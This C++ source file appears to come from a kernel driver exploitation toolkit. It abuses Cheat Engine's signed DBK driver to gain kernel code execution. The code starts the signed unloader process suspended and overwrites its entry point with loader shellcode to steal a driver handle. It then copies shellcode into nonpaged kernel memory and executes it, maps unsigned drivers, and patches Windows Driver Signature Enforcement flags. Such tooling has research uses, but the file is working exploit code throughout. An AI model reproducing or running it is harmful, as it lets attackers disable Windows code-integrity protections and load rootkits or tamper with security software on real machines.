/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       DBK.CPP
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  Cheat Engine's DBK driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/dbk.h"
#include "idrv/ldrsc.h"

#define DBK_GET_HANDLE 0x1337

#define DBK_LDR_DLL L"u.dll"
#define DBK_KMU_EXE L"kernelmoduleunloader.exe"
#define DBK_KMU_SIG L"kernelmoduleunloader.exe.sig"

#define DBK_DEVICE_NAME L"\\Device\\CEDRIVER73"
#define DBK_DEVICE_LINK L"\\DosDevices\\CEDRIVER73"
#define DBK_PROCESS_LIST L"\\BaseNamedObjects\\DBKProcList60"
#define DBK_THREAD_LIST L"\\BaseNamedObjects\\DBKThreadList60"

/*
* DbkSetupCheatEngineObjectNames
*
* Purpose:
*
* supLoadDriverEx callback to store specific CheatEngine's data in registry entry.
*
*/
NTSTATUS CALLBACK DbkSetupCheatEngineObjectNames(
    _In_ PUNICODE_STRING RegistryPath,
    _In_opt_ PVOID Param
)
{
    NTSTATUS ntStatus;
    HANDLE hKey = NULL;
    OBJECT_ATTRIBUTES obja;

    UNREFERENCED_PARAMETER(Param);

    InitializeObjectAttributes(&obja, RegistryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    ntStatus = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
    if (NT_SUCCESS(ntStatus)) {

        supRegWriteValueString(hKey, L"A", DBK_DEVICE_NAME);
        supRegWriteValueString(hKey, L"B", DBK_DEVICE_LINK);
        supRegWriteValueString(hKey, L"C", DBK_PROCESS_LIST);
        supRegWriteValueString(hKey, L"D", DBK_THREAD_LIST);

        NtClose(hKey);
    }

    return ntStatus;
}

/*
* DbkpIpcOnException
*
* Purpose:
*
* ALPC receive exception callback.
*
*/
VOID CALLBACK DbkpIpcOnException(
    _In_ ULONG ExceptionCode,
    _In_opt_ PVOID UserContext
)
{
    UNREFERENCED_PARAMETER(UserContext);

    supPrintfEvent(kduEventError,
        "[!] Exception 0x%lx thrown during IPC callback\r\n", ExceptionCode);
}

/*
* DbkpIpcCallback
*
* Purpose:
*
* ALPC receive message callback.
*
*/
VOID CALLBACK DbkpIpcCallback(
    _In_ PCLIENT_ID ClientId,
    _In_ PKDU_MSG Message,
    _In_opt_ PVOID UserContext
)
{
    KDU_CONTEXT* Context = (PKDU_CONTEXT)UserContext;

    if (Context == NULL)
        return;

    __try {

        if (Message->Function == DBK_GET_HANDLE &&
            Message->Status == STATUS_SECRET_TOO_LONG &&
            Message->ReturnedLength == sizeof(ULONG))
        {
            HANDLE hProcess = NULL, hNewHandle = NULL;
            OBJECT_ATTRIBUTES obja;

            InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);

            if (NT_SUCCESS(NtOpenProcess(&hProcess,
                PROCESS_DUP_HANDLE | PROCESS_TERMINATE,
                &obja,
                ClientId)))
            {
                if (NT_SUCCESS(NtDuplicateObject(
                    hProcess,
                    (HANDLE)Message->Data,
                    NtCurrentProcess(),
                    &hNewHandle,
                    0,
                    0,
                    DUPLICATE_SAME_ACCESS)))
                {
                    Context->DeviceHandle = hNewHandle;
                }

                NtTerminateProcess(hProcess, STATUS_TOO_MANY_SECRETS);
                NtClose(hProcess);
            }

        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return;
    }
}

/*
* DbkOpenCheatEngineDriver
*
* Purpose:
*
* Open Cheat Engine driver with it locking features in mind.
*
*/
BOOL DbkOpenCheatEngineDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bResult = FALSE;
    DWORD cch;
    PVOID ipcServer = NULL;
    WCHAR szTemp[MAX_PATH + 1];
    WCHAR szFileName[MAX_PATH * 2];

    RtlSecureZeroMemory(&szTemp, sizeof(szTemp));
    cch = supExpandEnvironmentStrings(L"%temp%", szTemp, MAX_PATH);
    if (cch == 0 || cch > MAX_PATH) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    supExtractFileToTemp(Context->ModuleBase, IDR_DATA_KMUEXE, szTemp, DBK_KMU_EXE, FALSE);
    supExtractFileToTemp(Context->ModuleBase, IDR_DATA_KMUSIG, szTemp, DBK_KMU_SIG, FALSE);
    supExtractFileToTemp(GetModuleHandle(NULL), IDR_TAIGEI32, szTemp, DBK_LDR_DLL, FALSE);

    StringCchPrintf(szFileName,
        MAX_PATH * 2,
        TEXT("%ws\\%ws"),
        szTemp,
        DBK_KMU_EXE);

    PVOID kmuBase = supMapFileAsImage(szFileName);
    PVOID entryPoint = NULL;
    if (kmuBase) {
        entryPoint = supGetEntryPointForMappedFile(kmuBase);
        UnmapViewOfFile(kmuBase);
    }
    else {
        SetLastError(ERROR_FILE_NOT_FOUND);
        goto Cleanup;
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    RtlSecureZeroMemory(&si, sizeof(si));
    RtlSecureZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
    GetStartupInfo(&si);

    if (CreateProcess(NULL,
        szFileName,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED,
        NULL,
        szTemp,
        &si,
        &pi))
    {
        SIZE_T memIO = 0;

        if (WriteProcessMemory(pi.hProcess,
            entryPoint,
            g_KduLoaderShellcode,
            sizeof(g_KduLoaderShellcode),
            &memIO))
        {
            ipcServer = IpcStartApiServer(DbkpIpcCallback,
                DbkpIpcOnException,
                NULL,
                NULL,
                (PVOID)Context);

            ResumeThread(pi.hThread);
        }

        if (ipcServer) {
            WaitForSingleObject(pi.hProcess, INFINITE);
        }

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        bResult = (Context->DeviceHandle != NULL);
    }

Cleanup:
    if (ipcServer) IpcStopApiServer(ipcServer);
    supExtractFileToTemp(NULL, 0, szTemp, DBK_KMU_EXE, TRUE);
    supExtractFileToTemp(NULL, 0, szTemp, DBK_KMU_SIG, TRUE);
    supExtractFileToTemp(NULL, 0, szTemp, DBK_LDR_DLL, TRUE);

    return bResult;
}

/*
* DbkStartVulnerableDriver
*
* Purpose:
*
* Load/open vulnerable driver callback.
*
*/
BOOL DbkStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bLoaded = FALSE;
    NTSTATUS ntStatus;
    KDU_DB_ENTRY* provLoadData = Context->Provider->LoadData;
    LPWSTR lpDeviceName = provLoadData->DeviceName;
    LPWSTR lpDriverName = provLoadData->DriverName;
    LPWSTR lpFullFileName = Context->DriverFileName;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        if (!KDUProvExtractVulnerableDriver(Context))
            return FALSE;

        ntStatus = supLoadDriverEx(lpDriverName,
            lpFullFileName,
            FALSE,
            DbkSetupCheatEngineObjectNames,
            NULL);

        if (NT_SUCCESS(ntStatus)) {

            supPrintfEvent(kduEventInformation,
                "[+] Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);

            bLoaded = TRUE;
        }
        else {

            supPrintfEvent(kduEventError,
                "[!] Unable to load vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);

            DeleteFile(lpFullFileName);
        }

    }

    if (bLoaded) {

        printf_s("[+] Acquiring handle for driver device \"%ws\" -> please wait, this can take a few seconds\r\n",
            provLoadData->DeviceName);

        if (DbkOpenCheatEngineDriver(Context)) {

            supPrintfEvent(kduEventInformation,
                "[+] Successfully acquired handle for driver device \"%ws\"\r\n",
                provLoadData->DeviceName);

        }
    }

    return (Context->DeviceHandle != NULL);
}

/*
* DbkpAllocateNonPagedMemory
*
* Purpose:
*
* Allocates nonpaged executable memory by calling ExAllocatePool.
*
*/
PVOID DbkpAllocateNonPagedMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG Size
)
{
    struct {
        ULONG Size;
    } inputBuffer;

    PVOID pvMemory = NULL;

    inputBuffer.Size = Size;

    NTSTATUS ntStatus = supCallDriver(DeviceHandle,
        IOCTL_CE_ALLOCATEMEM_NONPAGED,
        &inputBuffer,
        sizeof(inputBuffer),
        &pvMemory,
        sizeof(pvMemory));

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
        pvMemory = NULL;
    }
    return pvMemory;
}

/*
* DbkpFreeMemory
*
* Purpose:
*
* Attempts to call ExFreePool for given address.
*
*/
BOOL DbkpFreeMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Address
)
{
    struct {
        PVOID Address;
    } inputBuffer;

    inputBuffer.Address = Address;

    NTSTATUS ntStatus = supCallDriver(DeviceHandle,
        IOCTL_CE_FREEMEM,
        &inputBuffer,
        sizeof(inputBuffer),
        NULL,
        0);

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
        return FALSE;
    }

    return TRUE;
}

/*
* DbkpMapMemorySelf
*
* Purpose:
*
* Map memory to current process VA space using MDL.
*
*/
PVOID DbkpMapMemorySelf(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Address,
    _In_ ULONG Size,
    _Out_ PVOID* MdlAddress
)
{
    struct {
        ULONG_PTR SourceProcessId;
        ULONG_PTR TargetProcessId;
        PVOID Address;
        ULONG Size;
    } inputBuffer;

    struct {
        PVOID Mdl;
        PVOID Address;
    } outputBuffer;

    inputBuffer.SourceProcessId = 0;
    inputBuffer.TargetProcessId = 0;
    inputBuffer.Address = Address;
    inputBuffer.Size = Size;

    outputBuffer.Address = NULL;
    outputBuffer.Mdl = NULL;

    *MdlAddress = NULL;

    NTSTATUS ntStatus = supCallDriver(DeviceHandle,
        IOCTL_CE_MAP_MEMORY,
        &inputBuffer,
        sizeof(inputBuffer),
        &outputBuffer,
        sizeof(outputBuffer));

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
        return NULL;
    }

    *MdlAddress = outputBuffer.Mdl;

    return outputBuffer.Address;
}

/*
* DbkpUnmapMemorySelf
*
* Purpose:
*
* Unmap memory from current process VA space using MDL.
*
*/
BOOL DbkpUnmapMemorySelf(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Address,
    _In_ PVOID Mdl
)
{
    struct {
        PVOID Mdl;
        PVOID Address;
    } inputBuffer;

    inputBuffer.Mdl = Mdl;
    inputBuffer.Address = Address;

    NTSTATUS ntStatus = supCallDriver(DeviceHandle,
        IOCTL_CE_UNMAP_MEMORY,
        &inputBuffer,
        sizeof(inputBuffer),
        NULL,
        0);

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
        return FALSE;
    }

    return TRUE;
}

/*
* DbkpExecuteCodeAtAddress
*
* Purpose:
*
* Run code at specified address in kernel mode.
*
*/
BOOL DbkpExecuteCodeAtAddress(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Address
)
{
    struct {
        PVOID Address;
        PVOID Parameters;
    } inputBuffer;

    inputBuffer.Address = Address;
    inputBuffer.Parameters = NULL;

    NTSTATUS ntStatus = supCallDriver(DeviceHandle,
        IOCTL_CE_EXECUTE_CODE,
        &inputBuffer,
        sizeof(inputBuffer),
        NULL,
        0);

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
        return FALSE;
    }

    return TRUE;
}

/*
* DbkpMapAndExecuteCode
*
* Purpose:
*
* Allocate page for shellcode, map it and execute.
*
*/
BOOL DbkpMapAndExecuteCode(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ShellCode,
    _In_ ULONG SizeOfShellCode,
    _In_ BOOLEAN ShowResult,
    _In_opt_ HANDLE ReadyEventHandle,
    _In_opt_ HANDLE SectionHandle
)
{
    BOOL bSuccess = FALSE;
    HANDLE deviceHandle = Context->DeviceHandle;

    PVOID pvPage = DbkpAllocateNonPagedMemory(deviceHandle, PAGE_SIZE);

    if (pvPage) {

        printf_s("[+] NonPagedPool memory allocated at 0x%p\r\n", pvPage);

        PVOID mdl = NULL, ptr = NULL;

        ptr = DbkpMapMemorySelf(deviceHandle, pvPage, PAGE_SIZE, &mdl);
        if (ptr && mdl) {

            printf_s("[+] Mdl allocated at 0x%p\r\n", mdl);
            printf_s("[+] Memory mapped at 0x%p\r\n", ptr);

            RtlCopyMemory(ptr,
                ShellCode,
                SizeOfShellCode);

            DbkpUnmapMemorySelf(deviceHandle, ptr, mdl);

            printf_s("[+] Executing code at 0x%p\r\n", pvPage);

            bSuccess = DbkpExecuteCodeAtAddress(deviceHandle, pvPage);

            if (bSuccess) {

                printf_s("[+] Code executed successfully\r\n");

                if (ShowResult &&
                    ReadyEventHandle &&
                    SectionHandle)
                {

                    //
                    // Wait for the shellcode to trigger the event
                    //
                    if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {

                        supPrintfEvent(kduEventError,
                            "[!] Shellcode did not trigger the event within two seconds.\r\n");

                        bSuccess = FALSE;
                    }
                    else
                    {

                        KDUShowPayloadResult(Context, SectionHandle);
                    }
                }

            }
            else {
                supPrintfEvent(kduEventError,
                    "[!] Could not execute code, GetLastError %lu\r\n", GetLastError());
            }

        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Could not map memory, GetLastError %lu\r\n", GetLastError());
        }

        DbkpFreeMemory(deviceHandle, pvPage);
    }
    else {
        supPrintfEvent(kduEventError,
            "[!] Could not allocate nonpaged memory, GetLastError %lu\r\n", GetLastError());
    }

    return bSuccess;
}

/*
* DbkMapDriver
*
* Purpose:
*
* Run mapper.
*
*/
BOOL DbkMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase)
{
    BOOL bSuccess = FALSE;
    PVOID pvShellCode;
    HANDLE deviceHandle;
    HANDLE sectionHandle = NULL;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    deviceHandle = Context->DeviceHandle;

    pvShellCode = KDUSetupShellCode(Context, ImageBase, &sectionHandle);
    if (pvShellCode) {

        HANDLE readyEventHandle = ScCreateReadyEvent(Context->ShellVersion, pvShellCode);
        if (readyEventHandle) {

            DbkpMapAndExecuteCode(Context,
                pvShellCode,
                ScSizeOf(Context->ShellVersion, NULL),
                TRUE,
                readyEventHandle,
                sectionHandle);

            CloseHandle(readyEventHandle);

        } //readyEventHandle
        else {

            supPrintfEvent(kduEventError,
                "[!] Error building the ready event handle, abort\r\n");

            bSuccess = FALSE;
        }

        if (sectionHandle) {
            NtClose(sectionHandle);
        }

    } //pvShellCode
    else {

        supPrintfEvent(kduEventError,
            "[!] Error while building shellcode, abort\r\n");

        bSuccess = FALSE;
    }

    if (pvShellCode) 
        ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bSuccess;
}

#ifdef __cplusplus
extern "C" {
    void BaseShellDSEFix();
    void BaseShellDSEFixEnd();
}
#endif

/*
* DbkControlDSE
*
* Purpose:
*
* Change Windows CodeIntegrity flags state via Dbk driver.
*
*/
BOOL DbkControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;

    BYTE shellBuffer[SHELLCODE_SMALL];
    SIZE_T shellSize = (ULONG_PTR)BaseShellDSEFixEnd - (ULONG_PTR)BaseShellDSEFix;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
    RtlCopyMemory(shellBuffer, BaseShellDSEFix, shellSize);

    *(PULONG_PTR)&shellBuffer[0x2] = Address;
    *(PULONG_PTR)&shellBuffer[0xC] = DSEValue;

    if (shellSize > SHELLCODE_SMALL) {
        supPrintfEvent(kduEventError,
            "[!] Patch code size 0x%llX exceeds limit 0x%lX, abort\r\n", shellSize, SHELLCODE_SMALL);

        return FALSE;
    }

    printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
        (PVOID)Address,
        DSEValue);

    if (DbkpMapAndExecuteCode(Context,
        shellBuffer,
        (ULONG)shellSize,
        FALSE,
        NULL,
        NULL))
    {
        supPrintfEvent(kduEventInformation,
            "[+] DSE patch executed successfully\r\n");
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult;
}
